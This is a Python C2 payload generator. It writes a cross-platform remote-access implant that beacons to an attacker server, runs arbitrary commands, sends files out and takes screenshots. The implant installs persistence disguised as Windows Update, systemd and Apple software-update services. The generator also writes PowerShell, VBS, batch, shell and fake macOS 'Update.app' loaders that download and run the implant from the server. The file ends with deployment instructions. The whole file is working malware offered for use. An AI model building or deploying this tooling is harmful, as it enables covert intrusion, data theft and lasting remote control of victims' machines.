#!/usr/bin/env python3
import os
import sys
import base64
import random
import string
import platform

class PayloadGenerator:
    def __init__(self, server_url, output_dir="./payloads"):
        self.server_url = server_url
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def generate_python_implant(self, output_name="implant.py"):
        """Generate Python implant (works on Windows/Linux/macOS)"""
        
        # Create a universal implant
        implant_code = self.create_universal_implant()
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(implant_code)
        
        # Make executable on Unix-like systems
        if platform.system() != "Windows":
            os.chmod(output_path, 0o755)
        
        print(f"[+] Python implant created: {output_path}")
        print(f"    Works on: Windows, Linux, macOS")
        return output_path
    
    def create_universal_implant(self):
        """Create a single implant that works on all OSes"""
        
        implant = f'''#!/usr/bin/env python3
"""
Cross-Platform C2 Implant
Works on: Windows, Linux, macOS
"""

import subprocess
import requests
import json
import time
import socket
import platform
import os
import sys
import base64
import random
import threading
from datetime import datetime

# Disable SSL warnings for testing
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CrossPlatformImplant:
    def __init__(self):
        self.server_url = "{self.server_url}"
        self.agent_id = None
        self.session_key = None
        self.running = True
        self.beacon_interval = 5
        self.jitter = 20
        self.working_dir = os.getcwd()
        self.os_type = platform.system()
        
    def get_local_ip(self):
        """Get local IP address (cross-platform)"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def get_system_info(self):
        """Collect system information (cross-platform)"""
        
        # Get username (works differently on different OSes)
        try:
            if self.os_type == "Windows":
                username = os.environ.get('USERNAME', 'unknown')
            else:
                username = os.environ.get('USER', os.environ.get('LOGNAME', 'unknown'))
        except:
            username = 'unknown'
        
        # Check admin/root privileges
        try:
            if self.os_type == "Windows":
                import ctypes
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                privilege = "admin" if is_admin else "user"
            else:
                privilege = "root" if os.geteuid() == 0 else "user"
        except:
            privilege = "unknown"
        
        return {{
            "hostname": socket.gethostname(),
            "username": username,
            "os_type": self.os_type,
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.machine(),
            "ip_address": self.get_local_ip(),
            "working_dir": self.working_dir,
            "privilege_level": privilege,
            "process_id": os.getpid(),
            "processor": platform.processor()
        }}
    
    def execute_command(self, command):
        """Execute system command (cross-platform)"""
        try:
            # Handle cd command (works on all OSes)
            if command.lower().startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    self.working_dir = os.getcwd()
                    return f"[+] Changed directory to: {self.working_dir}"
                except Exception as e:
                    return f"[-] Failed to change directory: {str(e)}"
            
            # Handle upload command (custom)
            if command.lower().startswith('upload '):
                return self.handle_upload(command)
            
            # Handle download command (custom)
            if command.lower().startswith('download '):
                return self.handle_download(command)
            
            # Handle screenshot command
            if command.lower() == 'screenshot':
                return self.take_screenshot()
            
            # Handle persistence command
            if command.lower() == 'persistence':
                return self.install_persistence()
            
            # Execute normal command
            if self.os_type == "Windows":
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    cwd=self.working_dir
                )
            else:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30,
                    cwd=self.working_dir,
                    executable='/bin/bash'
                )
            
            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = "[+] Command executed successfully (no output)"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "[-] Command timed out after 30 seconds"
        except Exception as e:
            return f"[-] Error: {str(e)}"
    
    def handle_upload(self, command):
        """Handle file upload to server"""
        parts = command.split()
        if len(parts) < 2:
            return "[-] Usage: upload <file_path>"
        
        file_path = parts[1]
        try:
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    file_data = base64.b64encode(f.read()).decode()
                
                # Send file to server
                response = requests.post(
                    f"{self.server_url}/api/upload",
                    json={{
                        'agent_id': self.agent_id,
                        'file_path': file_path,
                        'file_data': file_data
                    }},
                    verify=False,
                    timeout=30
                )
                
                if response.status_code == 200:
                    return f"[+] File uploaded: {file_path}"
                else:
                    return f"[-] Upload failed: {response.text}"
            else:
                return f"[-] File not found: {file_path}"
        except Exception as e:
            return f"[-] Upload error: {str(e)}"
    
    def handle_download(self, command):
        """Handle file download from server"""
        parts = command.split()
        if len(parts) < 2:
            return "[-] Usage: download <remote_file_path>"
        
        file_path = parts[1]
        try:
            # Request file from server
            response = requests.get(
                f"{self.server_url}/api/download",
                params={{'agent_id': self.agent_id, 'file_path': file_path}},
                verify=False,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if 'file_data' in data:
                    file_content = base64.b64decode(data['file_data'])
                    local_name = os.path.basename(file_path)
                    with open(local_name, 'wb') as f:
                        f.write(file_content)
                    return f"[+] File downloaded: {local_name}"
            return f"[-] Download failed: {response.text}"
        except Exception as e:
            return f"[-] Download error: {str(e)}"
    
    def take_screenshot(self):
        """Take screenshot (cross-platform)"""
        try:
            if self.os_type == "Windows":
                import pyautogui
                screenshot = pyautogui.screenshot()
                screenshot_path = f"screenshot_{int(time.time())}.png"
                screenshot.save(screenshot_path)
                return f"[+] Screenshot saved: {screenshot_path}"
            elif self.os_type == "Linux" or self.os_type == "Darwin":  # Darwin = macOS
                import pyscreenshot as ImageGrab
                screenshot = ImageGrab.grab()
                screenshot_path = f"screenshot_{int(time.time())}.png"
                screenshot.save(screenshot_path)
                return f"[+] Screenshot saved: {screenshot_path}"
            else:
                return "[-] Screenshot not supported on this OS"
        except ImportError:
            return "[-] Screenshot libraries not installed. Install: pip install pillow pyscreenshot pyautogui"
        except Exception as e:
            return f"[-] Screenshot error: {str(e)}"
    
    def install_persistence(self):
        """Install persistence mechanism"""
        try:
            if self.os_type == "Windows":
                return self.persistence_windows()
            elif self.os_type == "Linux":
                return self.persistence_linux()
            elif self.os_type == "Darwin":
                return self.persistence_macos()
            else:
                return "[-] Persistence not supported on this OS"
        except Exception as e:
            return f"[-] Persistence error: {str(e)}"
    
    def persistence_windows(self):
        """Windows persistence via Registry"""
        try:
            import ctypes
            import ctypes.wintypes
            
            # Add to Run registry key
            script_path = os.path.abspath(sys.argv[0])
            reg_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key_name = "WindowsUpdateService"
            
            # Use PowerShell to add registry entry
            cmd = f'powershell -Command "New-ItemProperty -Path \'HKCU:{reg_path}\' -Name \'{key_name}\' -Value \'python {script_path}\' -Force"'
            subprocess.run(cmd, shell=True, capture_output=True)
            
            return "[+] Windows persistence installed (HKCU Run key)"
        except Exception as e:
            return f"[-] Windows persistence failed: {str(e)}"
    
    def persistence_linux(self):
        """Linux persistence via crontab or systemd"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            
            # Try crontab first
            cron_line = f"@reboot python3 {script_path} > /dev/null 2>&1"
            result = subprocess.run(
                f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -',
                shell=True,
                capture_output=True
            )
            
            if result.returncode == 0:
                return "[+] Linux persistence installed (crontab)"
            
            # Try systemd as fallback
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 {script_path}
Restart=always
User={os.environ.get('USER', 'root')}

[Install]
WantedBy=multi-user.target
"""
            service_path = "/etc/systemd/system/system-update.service"
            with open(service_path, 'w') as f:
                f.write(service_content)
            
            subprocess.run(f"systemctl enable system-update.service", shell=True)
            subprocess.run(f"systemctl start system-update.service", shell=True)
            
            return "[+] Linux persistence installed (systemd)"
        except Exception as e:
            return f"[-] Linux persistence failed: {str(e)}"
    
    def persistence_macos(self):
        """macOS persistence via LaunchAgent"""
        try:
            script_path = os.path.abspath(sys.argv[0])
            plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.softwareupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>'''
            
            plist_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.softwareupdate.plist")
            with open(plist_path, 'w') as f:
                f.write(plist_content)
            
            subprocess.run(f"launchctl load {plist_path}", shell=True)
            subprocess.run(f"launchctl start com.apple.softwareupdate", shell=True)
            
            return "[+] macOS persistence installed (LaunchAgent)"
        except Exception as e:
            return f"[-] macOS persistence failed: {str(e)}"
    
    def random_user_agent(self):
        """Random User-Agent for evasion"""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36'
        ]
        return random.choice(agents)
    
    def register(self):
        """Register with C2 server"""
        try:
            # Collect system info
            info = self.get_system_info()
            
            # Send registration request
            response = requests.post(
                f"{self.server_url}/api/register",
                json=info,
                verify=False,
                headers={'User-Agent': self.random_user_agent()},
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.agent_id = data.get('agent_id')
                self.beacon_interval = data.get('sleep_time', 5)
                print(f"[+] Registered with ID: {self.agent_id}")
                return True
            else:
                print(f"[-] Registration failed: {response.status_code}")
                return False
                
        except Exception as e:
            print(f"[-] Registration error: {str(e)}")
            return False
    
    def beacon(self):
        """Main beacon loop"""
        print(f"[*] Starting beaconing to {self.server_url}")
        
        while self.running:
            try:
                # Send heartbeat
                heartbeat = {
                    'agent_id': self.agent_id,
                    'timestamp': datetime.now().isoformat(),
                    'working_dir': self.working_dir
                }
                
                response = requests.post(
                    f"{self.server_url}/api/beacon",
                    json=heartbeat,
                    verify=False,
                    headers={'User-Agent': self.random_user_agent()},
                    timeout=30
                )
                
                if response.status_code == 200:
                    tasks = response.json().get('tasks', [])
                    
                    for task in tasks:
                        print(f"[*] Received task: {task.get('command')}")
                        output = self.execute_command(task.get('command'))
                        
                        # Send task result
                        result = {
                            'agent_id': self.agent_id,
                            'task_id': task.get('id'),
                            'output': output,
                            'status': 'completed'
                        }
                        
                        requests.post(
                            f"{self.server_url}/api/task_result",
                            json=result,
                            verify=False,
                            timeout=30
                        )
                        
                        print(f"[+] Task completed")
                
                # Sleep with jitter
                sleep_time = self.beacon_interval + random.randint(-self.jitter, self.jitter)
                sleep_time = max(1, sleep_time)
                time.sleep(sleep_time)
                
            except requests.exceptions.RequestException as e:
                print(f"[-] Network error: {str(e)}")
                time.sleep(30)
            except Exception as e:
                print(f"[-] Beacon error: {str(e)}")
                time.sleep(60)
    
    def run(self):
        """Main execution"""
        print(f"[*] C2 Implant starting on {self.os_type}")
        print(f"[*] Server URL: {self.server_url}")
        
        if self.register():
            self.beacon()
        else:
            print("[-] Failed to register. Retrying in 60 seconds...")
            time.sleep(60)
            self.run()

if __name__ == '__main__':
    implant = CrossPlatformImplant()
    implant.run()
EOF'''
        
        print(f"[+] Universal implant code created")
        return implant
    
    def generate_windows_exe(self, output_name="implant.exe"):
        """Generate Windows executable (requires pyinstaller)"""
        try:
            # Check and install pyinstaller
            try:
                import PyInstaller
            except ImportError:
                print("[*] Installing PyInstaller...")
                os.system("pip3 install pyinstaller")
            
            # Generate Python implant
            implant_path = self.generate_python_implant("temp_implant.py")
            
            # Build for Windows
            print("[*] Building Windows executable...")
            os.system(f"pyinstaller --onefile --noconsole --name {output_name.replace('.exe', '')} {implant_path}")
            
            # Cleanup
            if os.path.exists(implant_path):
                os.remove(implant_path)
            
            exe_path = f"dist/{output_name}"
            if os.path.exists(exe_path):
                print(f"[+] Windows executable created: {exe_path}")
                print(f"    Size: {os.path.getsize(exe_path)} bytes")
                return exe_path
            else:
                print(f"[-] Failed to create executable")
                return None
                
        except Exception as e:
            print(f"[-] Error building executable: {str(e)}")
            return None
    
    def generate_linux_binary_alternative(self, output_name="implant.bin"):
        """Alternative Linux binary without cython"""
        print("[*] Creating Linux wrapper script...")
        
        wrapper = f'''#!/bin/bash
# Linux wrapper script for C2 implant
python3 -c "$(curl -k -s {self.server_url}/payloads/implant.py)" 2>/dev/null || wget -q -O - {self.server_url}/payloads/implant.py | python3
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(wrapper)
        
        os.chmod(output_path, 0o755)
        print(f"[+] Linux wrapper created: {output_path}")
        return output_path
    
    def generate_powershell_loader(self, output_name="loader.ps1"):
        """Generate PowerShell loader for Windows"""
        
        implant_b64 = self.get_implant_base64()
        
        ps_script = f'''# PowerShell Loader for C2 Implant
$implantCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("{implant_b64}"))
$tempFile = "$env:TEMP\\svchost.py"
$implantCode | Out-File -FilePath $tempFile -Encoding UTF8

# Execute implant
Start-Process -FilePath "python" -ArgumentList "$tempFile" -WindowStyle Hidden

# Cleanup after 30 seconds
Start-Sleep -Seconds 30
Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(ps_script)
        
        print(f"[+] PowerShell loader created: {output_path}")
        return output_path
    
    def generate_vbs_loader(self, output_name="loader.vbs"):
        """Generate VBS loader for Windows (bypasses some AV)"""
        
        ps_script_path = os.path.join(self.output_dir, "loader.ps1")
        if not os.path.exists(ps_script_path):
            self.generate_powershell_loader()
        
        vbs_script = f'''Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File "{ps_script_path}"", 0, False
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(vbs_script)
        
        print(f"[+] VBS loader created: {output_path}")
        return output_path
    
    def generate_batch_loader(self, output_name="loader.bat"):
        """Generate batch loader for Windows"""
        
        batch_script = f'''@echo off
powershell -ExecutionPolicy Bypass -Command "& {{ $wc=New-Object System.Net.WebClient; $wc.DownloadString('{self.server_url}/payloads/implant.py') | python - }}"
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(batch_script)
        
        print(f"[+] Batch loader created: {output_path}")
        return output_path
    
    def generate_macos_app(self, output_name="Update.app"):
        """Generate macOS application bundle"""
        
        app_path = os.path.join(self.output_dir, output_name)
        os.makedirs(app_path, exist_ok=True)
        os.makedirs(os.path.join(app_path, "Contents/MacOS"), exist_ok=True)
        os.makedirs(os.path.join(app_path, "Contents/Resources"), exist_ok=True)
        
        # Create Info.plist
        plist = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>launcher</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.SoftwareUpdate</string>
    <key>CFBundleName</key>
    <string>SoftwareUpdate</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
</dict>
</plist>'''
        
        with open(os.path.join(app_path, "Contents/Info.plist"), "w") as f:
            f.write(plist)
        
        # Create launcher script
        launcher = f'''#!/bin/bash
python3 -c "$(curl -k -s {self.server_url}/payloads/implant.py)" 2>/dev/null &
'''
        
        with open(os.path.join(app_path, "Contents/MacOS/launcher"), "w") as f:
            f.write(launcher)
        
        os.chmod(os.path.join(app_path, "Contents/MacOS/launcher"), 0o755)
        
        print(f"[+] macOS app bundle created: {app_path}")
        return app_path
    
    def get_implant_base64(self):
        """Get base64 encoded implant"""
        implant_path = os.path.join(self.output_dir, "implant.py")
        if not os.path.exists(implant_path):
            self.generate_python_implant()
        
        with open(implant_path, "r") as f:
            implant_code = f.read()
        
        return base64.b64encode(implant_code.encode()).decode()
    
    def generate_all_payloads(self):
        """Generate all available payloads"""
        print("\n[*] Generating all payloads...")
        print("=" * 50)
        
        payloads = []
        
        # Python implant (cross-platform)
        payloads.append(("Python Implant", self.generate_python_implant()))
        
        # Windows payloads
        print("\n[*] Windows Payloads:")
        payloads.append(("PowerShell Loader", self.generate_powershell_loader()))
        payloads.append(("VBS Loader", self.generate_vbs_loader()))
        payloads.append(("Batch Loader", self.generate_batch_loader()))
        
        # Try to generate Windows executable
        if platform.system() == "Windows" or os.name == "nt":
            exe_path = self.generate_windows_exe()
            if exe_path:
                payloads.append(("Windows EXE", exe_path))
        else:
            print("[!] Windows EXE generation requires Windows OS or Wine")
        
        # Linux payloads
        print("\n[*] Linux Payloads:")
        payloads.append(("Linux Wrapper", self.generate_linux_binary_alternative()))
        
        # macOS payloads
        print("\n[*] macOS Payloads:")
        payloads.append(("macOS App Bundle", self.generate_macos_app()))
        
        print("\n" + "=" * 50)
        print("[+] Payload generation complete!")
        print(f"[+] All payloads saved to: {self.output_dir}")
        
        return payloads

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 payload_generator_fixed.py <C2_SERVER_URL>")
        print("Example: python3 payload_generator_fixed.py https://172.24.1.83:443")
        sys.exit(1)
    
    server_url = sys.argv[1]
    
    print("=" * 60)
    print("Cross-Platform C2 Payload Generator")
    print("=" * 60)
    print(f"[*] C2 Server URL: {server_url}")
    print(f"[*] Operating System: {platform.system()}")
    print(f"[*] Python Version: {platform.python_version()}")
    print("=" * 60)
    
    generator = PayloadGenerator(server_url)
    generator.generate_all_payloads()
    
    print("\n[*] Deployment Instructions:")
    print("-" * 40)
    print("1. Windows:")
    print("   - Python: python implant.py")
    print("   - PowerShell: powershell -ExecutionPolicy Bypass -File loader.ps1")
    print("   - VBS: cscript loader.vbs")
    print("   - EXE: Run implant.exe directly")
    print("\n2. Linux:")
    print("   - Python: python3 implant.py")
    print("   - Wrapper: ./implant.bin")
    print("\n3. macOS:")
    print("   - Python: python3 implant.py")
    print("   - App: Open Update.app")
    print("=" * 60)
